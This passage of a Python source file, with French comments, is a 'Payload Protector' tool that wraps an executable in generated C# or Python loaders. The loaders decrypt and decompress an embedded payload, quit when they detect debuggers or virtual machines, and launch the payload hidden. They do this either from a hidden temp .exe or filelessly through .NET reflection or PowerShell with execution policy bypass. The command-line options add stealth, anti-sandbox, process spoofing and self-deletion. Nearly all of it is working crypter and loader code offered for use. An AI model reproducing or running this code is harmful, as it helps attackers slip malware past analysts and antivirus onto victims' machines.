            cs_lines.append("                        output.Write(layerData, 0, layerData.Length);")
            cs_lines.append("                    }")
            cs_lines.append("                }")
            cs_lines.append("                return output.ToArray();")
            cs_lines.append("            }")
            cs_lines.append("        }")
        
        # ExecuteStandard method
        cs_lines.append("")
        cs_lines.append("        private static void ExecuteStandard(byte[] exeData)")
        cs_lines.append("        {")
        cs_lines.append("            string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString(\"N\") + \".exe\");")
        cs_lines.append("            File.WriteAllBytes(tempPath, exeData);")
        cs_lines.append("            SetFileAttributes(tempPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);")
        cs_lines.append("")
        cs_lines.append("            ProcessStartInfo psi = new ProcessStartInfo")
        cs_lines.append("            {")
        cs_lines.append("                FileName = tempPath,")
        cs_lines.append("                UseShellExecute = false,")
        cs_lines.append("                CreateNoWindow = true,")
        cs_lines.append("                WindowStyle = ProcessWindowStyle.Hidden")
        cs_lines.append("            };")
        cs_lines.append("")
        cs_lines.append("            Process.Start(psi).WaitForExit();")
        cs_lines.append("")
        cs_lines.append("            try { File.Delete(tempPath); } catch { }")
        cs_lines.append("        }")
        
        # ExecuteFileless method
        cs_lines.append("")
        cs_lines.append("        private static void ExecuteFileless(byte[] exeData)")
        cs_lines.append("        {")
        cs_lines.append("            // Chargement en memoire via reflexion .NET")
        cs_lines.append("            try")
        cs_lines.append("            {")
        cs_lines.append("                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(exeData);")
        cs_lines.append("                System.Reflection.MethodInfo entryPoint = assembly.EntryPoint;")
        cs_lines.append("")
        cs_lines.append("                if (entryPoint != null)")
        cs_lines.append("                {")
        cs_lines.append("                    entryPoint.Invoke(null, new object[] { new string[] { } });")
        cs_lines.append("                }")
        cs_lines.append("                else")
        cs_lines.append("                {")
        cs_lines.append("                    foreach (var type in assembly.GetTypes())")
        cs_lines.append("                    {")
        cs_lines.append("                        var method = type.GetMethod(\"Main\", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.NonPublic);")
        cs_lines.append("                        if (method != null)")
        cs_lines.append("                        {")
        cs_lines.append("                            method.Invoke(null, new object[] { new string[] { } });")
        cs_lines.append("                            break;")
        cs_lines.append("                        }")
        cs_lines.append("                    }")
        cs_lines.append("                }")
        cs_lines.append("            }")
        cs_lines.append("            catch")
        cs_lines.append("            {")
        cs_lines.append("                // Fallback sur execution standard")
        cs_lines.append("                ExecuteStandard(exeData);")
        cs_lines.append("            }")
        cs_lines.append("        }")
        
        # Closing braces
        cs_lines.append("    }")
        cs_lines.append("}")
        
        return "\n".join(cs_lines)
    
    def generate_python_loader(self, payload_data: dict) -> str:
        """Génère un loader Python autonome."""
        
        config = self.config
        pl_lines = []
        
        # Header
        pl_lines.append("#!/usr/bin/env python3")
        pl_lines.append("# Protected Payload Loader - Auto-generated")
        pl_lines.append("# Mode: " + config.EXECUTION_MODE)
        pl_lines.append("")
        
        # Imports
        pl_lines.append("import base64")
        pl_lines.append("import struct")
        pl_lines.append("import hashlib")
        pl_lines.append("import hmac")
        pl_lines.append("import os")
        pl_lines.append("import sys")
        pl_lines.append("import tempfile")
        pl_lines.append("import subprocess")
        pl_lines.append("import time")
        pl_lines.append("import random")
        pl_lines.append("import ctypes")
        pl_lines.append("import warnings")
        pl_lines.append("")
        
        # Config dict
        pl_lines.append("_CONFIG = {")
        pl_lines.append("    \"anti_debug\": " + str(config.ANTI_DEBUG_ENABLED) + ",")
        pl_lines.append("    \"anti_vm\": " + str(config.ANTI_VM_ENABLED) + ",")
        pl_lines.append("    \"anti_sandbox\": " + str(config.ANTI_SANDBOX_ENABLED) + ",")
        pl_lines.append("    \"fileless\": " + str(config.EXECUTION_MODE == "fileless") + ",")
        pl_lines.append("    \"integrity_check\": " + str(config.INTEGRITY_CHECK) + ",")
        pl_lines.append("    \"compression\": \"" + config.COMPRESSION_ALGORITHM + "\",")
        pl_lines.append("    \"compression_layers\": " + str(config.COMPRESSION_LAYERS) + ",")
        pl_lines.append("    \"encryption\": \"" + config.ENCRYPTION_ALGORITHM + "\",")
        pl_lines.append("    \"pbkdf2_iterations\": " + str(config.PBKDF2_ITERATIONS) + ",")
        pl_lines.append("    \"expiration\": " + repr(config.EXPIRATION_DATE) + ",")
        pl_lines.append("    \"delay\": " + str(config.DELAY_EXECUTION) + ",")
        pl_lines.append("    \"verbose\": " + str(config.VERBOSE) + ",")
        pl_lines.append("}")
        pl_lines.append("")
        
        # Payload
        pl_lines.append("_PAYLOAD = \"\"\"")
        pl_lines.append(payload_data["payload"])
        pl_lines.append("\"\"\"")
        pl_lines.append("")
        
        # Password section
        if payload_data["password"]:
            pl_lines.append("_PASSWORD = \"\"\"" + payload_data["password"] + "\"\"\"")
            pl_lines.append("_SALT = base64.b64decode(\"\"\"" + (payload_data["salt"] or "") + "\"\"\")")
        else:
            pl_lines.append("_PASSWORD = None")
            pl_lines.append("_SALT = None")
        pl_lines.append("")
        
        # Helper functions
        pl_lines.append("def _derive_key(password: bytes, salt: bytes, iterations: int = " + str(config.PBKDF2_ITERATIONS) + ") -> bytes:")
        pl_lines.append("    return hashlib.pbkdf2_hmac('sha256', password, salt, iterations, dklen=32)")
        pl_lines.append("")
        pl_lines.append("def _decrypt_aes(data: bytes, key: bytes) -> bytes:")
        pl_lines.append("    nonce = data[:12]")
        pl_lines.append("    ciphertext = data[12:]")
        pl_lines.append("    try:")
        pl_lines.append("        from cryptography.hazmat.primitives.ciphers.aead import AESGCM")
        pl_lines.append("        aesgcm = AESGCM(key)")
        pl_lines.append("        return aesgcm.decrypt(nonce, ciphertext, None)")
        pl_lines.append("    except ImportError:")
        pl_lines.append("        extended_key = hashlib.sha256(key * 2).digest() + hashlib.sha256(key[::-1] * 2).digest()")
        pl_lines.append("        return bytes(b ^ extended_key[i % len(extended_key)] for i, b in enumerate(data[12:]))")
        pl_lines.append("")
        pl_lines.append("def _decrypt_chacha20(data: bytes, key: bytes) -> bytes:")
        pl_lines.append("    try:")
        pl_lines.append("        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305")
        pl_lines.append("        chacha = ChaCha20Poly1305(key)")
        pl_lines.append("        return chacha.decrypt(data[:12], data[12:], None)")
        pl_lines.append("    except ImportError:")
        pl_lines.append("        return _decrypt_aes(data, key)")
        pl_lines.append("")
        pl_lines.append("def _decompress(data: bytes, algorithm: str, layers: int) -> bytes:")
        pl_lines.append("    result = data")
        pl_lines.append("    for _ in range(layers):")
        pl_lines.append("        size = struct.unpack(\"<I\", result[:4])[0]")
        pl_lines.append("        compressed = result[4:4+size]")
        pl_lines.append("        result = result[4+size:]")
        pl_lines.append("        if algorithm == \"zlib\":")
        pl_lines.append("            import zlib")
        pl_lines.append("            result = zlib.decompress(compressed)")
        pl_lines.append("        elif algorithm == \"bz2\":")
        pl_lines.append("            import bz2")
        pl_lines.append("            result = bz2.decompress(compressed)")
        pl_lines.append("        elif algorithm == \"lzma\":")
        pl_lines.append("            import lzma")
        pl_lines.append("            result = lzma.decompress(compressed)")
        pl_lines.append("    return result")
        pl_lines.append("")
        pl_lines.append("def _check_debugger() -> bool:")
        pl_lines.append("    if sys.platform == \"win32\":")
        pl_lines.append("        try:")
        pl_lines.append("            kernel32 = ctypes.windll.kernel32")
        pl_lines.append("            if kernel32.IsDebuggerPresent():")
        pl_lines.append("                return True")
        pl_lines.append("            debugger_present = ctypes.c_bool(False)")
        pl_lines.append("            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(debugger_present))")
        pl_lines.append("            return debugger_present.value")
        pl_lines.append("        except:")
        pl_lines.append("            pass")
        pl_lines.append("    return False")
        pl_lines.append("")
        pl_lines.append("def _check_vm() -> bool:")
        pl_lines.append("    try:")
        pl_lines.append("        import uuid")
        pl_lines.append("        mac = uuid.getnode()")
        pl_lines.append("        mac_prefix = \"{:02x}:{:02x}:{:02x}\".format((mac >> 40) & 0xff, (mac >> 32) & 0xff, (mac >> 24) & 0xff)")
        pl_lines.append("        vm_macs = [\"08:00:27\", \"00:50:56\", \"00:0c:29\", \"00:15:5d\", \"00:16:3e\"]")
        pl_lines.append("        return any(mac_prefix.startswith(p) for p in vm_macs)")
        pl_lines.append("    except:")
        pl_lines.append("        return False")
        pl_lines.append("")
        pl_lines.append("def _execute_standard(exe_data: bytes):")
        pl_lines.append("    import string")
        pl_lines.append("    temp_dir = tempfile.gettempdir()")
        pl_lines.append("    temp_path = os.path.join(temp_dir, \"\".join(random.choices(string.ascii_lowercase, k=12)) + \".exe\")")
        pl_lines.append("    with open(temp_path, \"wb\") as f2:")
        pl_lines.append("        f2.write(exe_data)")
        pl_lines.append("    if sys.platform == \"win32\":")
        pl_lines.append("        ctypes.windll.kernel32.SetFileAttributesW(temp_path, 0x02)")
        pl_lines.append("    subprocess.run([temp_path], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == \"win32\" else 0)")
        pl_lines.append("    try:")
        pl_lines.append("        os.remove(temp_path)")
        pl_lines.append("    except:")
        pl_lines.append("        pass")
        pl_lines.append("")
        pl_lines.append("def _execute_fileless(exe_data: bytes):")
        pl_lines.append("    if sys.platform != \"win32\":")
        pl_lines.append("        _execute_standard(exe_data)")
        pl_lines.append("        return")
        pl_lines.append("    encoded = base64.b64encode(exe_data).decode()")
        pl_lines.append("    ps_script = \"\"\"")
        pl_lines.append("$encoded = \"{}\"")
        pl_lines.append("$bytes = [System.Convert]::FromBase64String($encoded)")
        pl_lines.append("$assembly = [System.Reflection.Assembly]::Load($bytes)")
        pl_lines.append("$entryPoint = $assembly.EntryPoint")
        pl_lines.append("if ($entryPoint) { $entryPoint.Invoke($null, @(@())) }")
        pl_lines.append("else {")
        pl_lines.append("    foreach ($type in $assembly.GetTypes()) {")
        pl_lines.append("        $method = $type.GetMethod(\"Main\")")
        pl_lines.append("        if ($method -and $method.IsStatic) { $method.Invoke($null, @(@())); break }")
        pl_lines.append("    }")
        pl_lines.append("}")
        pl_lines.append("\"\"\".format(encoded)")
        pl_lines.append("    startupinfo = subprocess.STARTUPINFO()")
        pl_lines.append("    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW")
        pl_lines.append("    startupinfo.wShowWindow = 0")
        pl_lines.append("    subprocess.run(")
        pl_lines.append("        [\"powershell.exe\", \"-ExecutionPolicy\", \"Bypass\", \"-WindowStyle\", \"Hidden\", \"-Command\", ps_script],")
        pl_lines.append("        startupinfo=startupinfo,")
        pl_lines.append("        creationflags=subprocess.CREATE_NO_WINDOW")
        pl_lines.append("    )")
        pl_lines.append("")
        
        # Main function
        pl_lines.append("def main():")
        pl_lines.append("    if _CONFIG[\"delay\"] > 0:")
        pl_lines.append("        time.sleep(_CONFIG[\"delay\"])")
        pl_lines.append("    ")
        pl_lines.append("    if _CONFIG[\"anti_debug\"] and _check_debugger():")
        pl_lines.append("        sys.exit(1)")
        pl_lines.append("    ")
        pl_lines.append("    if _CONFIG[\"anti_vm\"] and _check_vm():")
        pl_lines.append("        sys.exit(1)")
        pl_lines.append("    ")
        pl_lines.append("    # Decoder le payload")
        pl_lines.append("    encrypted_data = base64.b64decode(_PAYLOAD)")
        pl_lines.append("    ")
        pl_lines.append("    # Verification d'integrite")
        pl_lines.append("    if _CONFIG[\"integrity_check\"]:")
        pl_lines.append("        stored_hash = encrypted_data[-32:]")
        pl_lines.append("        payload_data = encrypted_data[:-32]")
        pl_lines.append("        computed_hash = hashlib.sha256(payload_data).digest()")
        pl_lines.append("        if not hmac.compare_digest(stored_hash, computed_hash):")
        pl_lines.append("            sys.exit(1)")
        pl_lines.append("        encrypted_data = payload_data")
        pl_lines.append("    ")
        
        # Decrypt section
        if config.ENCRYPTION_ENABLED:
            pl_lines.append("    # Dechiffrement")
            pl_lines.append("    if _PASSWORD:")
            pl_lines.append("        key = _derive_key(_PASSWORD.encode(), _SALT, _CONFIG[\"pbkdf2_iterations\"])")
            pl_lines.append("        actual_encrypted = encrypted_data[len(_SALT):]")
            pl_lines.append("        if _CONFIG[\"encryption\"] == \"aes\":")
            pl_lines.append("            decrypted = _decrypt_aes(actual_encrypted, key)")
            pl_lines.append("        elif _CONFIG[\"encryption\"] == \"chacha20\":")
            pl_lines.append("            decrypted = _decrypt_chacha20(actual_encrypted, key)")
            pl_lines.append("        else:")
            pl_lines.append("            extended_key = hashlib.sha256(key * 2).digest() + hashlib.sha256(key[::-1] * 2).digest()")
            pl_lines.append("            decrypted = bytes(b ^ extended_key[i % len(extended_key)] for i, b in enumerate(actual_encrypted))")
            pl_lines.append("    else:")
            pl_lines.append("        decrypted = encrypted_data")
        else:
            pl_lines.append("    decrypted = encrypted_data")
        pl_lines.append("    ")
        
        # Decompress section
        if config.COMPRESSION_ENABLED:
            pl_lines.append("    # Decompression")
            pl_lines.append("    if _CONFIG[\"compression\"] != \"none\":")
            pl_lines.append("        exe_data = _decompress(decrypted, _CONFIG[\"compression\"], _CONFIG[\"compression_layers\"])")
            pl_lines.append("    else:")
            pl_lines.append("        exe_data = decrypted")
        else:
            pl_lines.append("    exe_data = decrypted")
        pl_lines.append("    ")
        
        # Execution
        pl_lines.append("    # Execution")
        pl_lines.append("    if _CONFIG[\"fileless\"]:")
        pl_lines.append("        _execute_fileless(exe_data)")
        pl_lines.append("    else:")
        pl_lines.append("        _execute_standard(exe_data)")
        pl_lines.append("")
        pl_lines.append("if __name__ == \"__main__\":")
        pl_lines.append("    main()")
        
        return "\n".join(pl_lines)
    
    
# ============================================================
# INTERFACE EN LIGNE DE COMMANDE
# ============================================================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Payload Protector - Protege et package un executable C#",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples:
  %(prog)s verify.exe -o protected.cs --mode fileless
  %(prog)s verify.exe -o loader.py --lang python --compression lzma --encryption chacha20
  %(prog)s verify.exe -o protected.cs --anti-debug --anti-vm --anti-sandbox --stealth
        """)
    
    parser.add_argument("input", help="Chemin vers l'executable a proteger")
    parser.add_argument("-o", "--output", required=True, help="Fichier de sortie")
    parser.add_argument("--lang", choices=["csharp", "python"], default="csharp",
                       help="Langage du loader genere (defaut: csharp)")
    
    # Compression
    parser.add_argument("--compression", choices=["none", "zlib", "bz2", "lzma"], default="zlib",
                       help="Algorithme de compression")
    parser.add_argument("--compression-level", type=int, default=9, choices=range(1, 10),
                       help="Niveau de compression (1-9)")
    parser.add_argument("--compression-layers", type=int, default=2, choices=range(1, 4),
                       help="Nombre de passes de compression")
    
    # Chiffrement
    parser.add_argument("--encryption", choices=["none", "aes", "chacha20", "xor"], default="aes",
                       help="Algorithme de chiffrement")
    parser.add_argument("--kdf", choices=["pbkdf2", "scrypt"], default="pbkdf2",
                       help="Algorithme de derivation de cle")
    parser.add_argument("--pbkdf2-iterations", type=int, default=500000,
                       help="Iterations PBKDF2")
    
    # Furtivite
    parser.add_argument("--stealth", action="store_true", help="Activer toutes les techniques de furtivite")
    parser.add_argument("--string-obfuscation", action="store_true", help="Obfusquer les chaines")
    parser.add_argument("--dead-code", action="store_true", help="Inserer du code mort")
    
    # Anti-reverse
    parser.add_argument("--anti-debug", action="store_true", help="Anti-debugging")
    parser.add_argument("--anti-vm", action="store_true", help="Anti-machine virtuelle")
    parser.add_argument("--anti-sandbox", action="store_true", help="Anti-sandbox")
    parser.add_argument("--anti-dumper", action="store_true", help="Anti-dumping memoire")
    parser.add_argument("--timing-checks", action="store_true", help="Verifications de timing")
    
    # Execution
    parser.add_argument("--mode", choices=["standard", "fileless"], default="fileless",
                       help="Mode d'execution")
    parser.add_argument("--self-delete", action="store_true", help="Auto-suppression")
    parser.add_argument("--process-spoofing", action="store_true", help="Usurper le nom du processus")
    
    # Integrite
    parser.add_argument("--integrity-check", action="store_true", help="Verifier l'integrite")
    parser.add_argument("--expiration", type=str, default=None,
                       help="Date d'expiration (YYYY-MM-DD)")
    
    # Divers
    parser.add_argument("--delay", type=int, default=0, help="Delai avant execution (secondes)")
    parser.add_argument("--decoy", action="store_true", help="Operations leurres")
    parser.add_argument("-v", "--verbose", action="store_true", help="Mode verbeux")
    
    args = parser.parse_args()
    
    # Creer la configuration
    config = Config()
    config.COMPRESSION_ENABLED = args.compression != "none"
    config.COMPRESSION_ALGORITHM = args.compression
    config.COMPRESSION_LEVEL = args.compression_level
    config.COMPRESSION_LAYERS = args.compression_layers
    config.ENCRYPTION_ENABLED = args.encryption != "none"
    config.ENCRYPTION_ALGORITHM = args.encryption
    config.KEY_DERIVATION = args.kdf
    config.PBKDF2_ITERATIONS = args.pbkdf2_iterations
    config.STEALTH_ENABLED = args.stealth
    config.STRING_OBFUSCATION = args.string_obfuscation or args.stealth
    config.DEAD_CODE_INSERTION = args.dead_code or args.stealth
    config.ANTI_DEBUG_ENABLED = args.anti_debug or args.stealth
    config.ANTI_VM_ENABLED = args.anti_vm or args.stealth
    config.ANTI_SANDBOX_ENABLED = args.anti_sandbox or args.stealth
    config.ANTI_DUMPER_ENABLED = args.anti_dumper or args.stealth
    config.TIMING_CHECKS = args.timing_checks or args.stealth
    config.EXECUTION_MODE = args.mode
    config.SELF_DELETE = args.self_delete
    config.PROCESS_SPOOFING = args.process_spoofing or args.stealth
    config.INTEGRITY_CHECK = args.integrity_check or args.stealth
    config.EXPIRATION_DATE = args.expiration
    config.DELAY_EXECUTION = args.delay
    config.DECOY_OPERATIONS = args.decoy or args.stealth
    config.VERBOSE = args.verbose
    
    # Generer le payload
    generator = PayloadGenerator(config)
    
    print("[INFO] Traitement de: {}".format(args.input))
    print("[INFO] Mode: {}".format(config.EXECUTION_MODE))
    print("[INFO] Compression: {} (x{})".format(config.COMPRESSION_ALGORITHM, config.COMPRESSION_LAYERS))
    print("[INFO] Chiffrement: {}".format(config.ENCRYPTION_ALGORITHM))
    print("[INFO] Anti-debug: {}".format(config.ANTI_DEBUG_ENABLED))
    print("[INFO] Anti-VM: {}".format(config.ANTI_VM_ENABLED))
    print("[INFO] Anti-sandbox: {}".format(config.ANTI_SANDBOX_ENABLED))
    
    payload_data = generator.process_payload(args.input)
    
    print("[INFO] Taille originale: {} octets".format(payload_data["original_size"]))
    print("[INFO] Taille protegee: {} octets".format(payload_data["protected_size"]))
    print("[INFO] Ratio: {:.1f}%".format(payload_data["compression_ratio"]))
    
    # Generer le loader
    if args.lang == "csharp":
        loader_code = generator.generate_csharp_loader(payload_data)
    else:
        loader_code = generator.generate_python_loader(payload_data)
    
    with open(args.output, "w", encoding="utf-8") as f2:
        f2.write(loader_code)
    
    print("[SUCCES] Loader genere: {}".format(args.output))
    
    # Sauvegarder les metadonnees
    meta_path = args.output + ".meta.json"
    with open(meta_path, "w") as f2:
        json.dump({
            "original_size": payload_data["original_size"],
            "protected_size": payload_data["protected_size"],
            "compression_ratio": payload_data["compression_ratio"],
            "password": payload_data["password"],
            "salt": payload_data["salt"],
            "config": {
                "compression": config.COMPRESSION_ALGORITHM,
                "compression_layers": config.COMPRESSION_LAYERS,
                "encryption": config.ENCRYPTION_ALGORITHM,
                "execution_mode": config.EXECUTION_MODE,
                "anti_debug": config.ANTI_DEBUG_ENABLED,
                "anti_vm": config.ANTI_VM_ENABLED,
                "anti_sandbox": config.ANTI_SANDBOX_ENABLED,
                "integrity_check": config.INTEGRITY_CHECK,
                "expiration": config.EXPIRATION_DATE,
            }
        }, f2, indent=2)
    
    print("[INFO] Metadonnees: {}".format(meta_path))


if __name__ == "__main__":
    main()
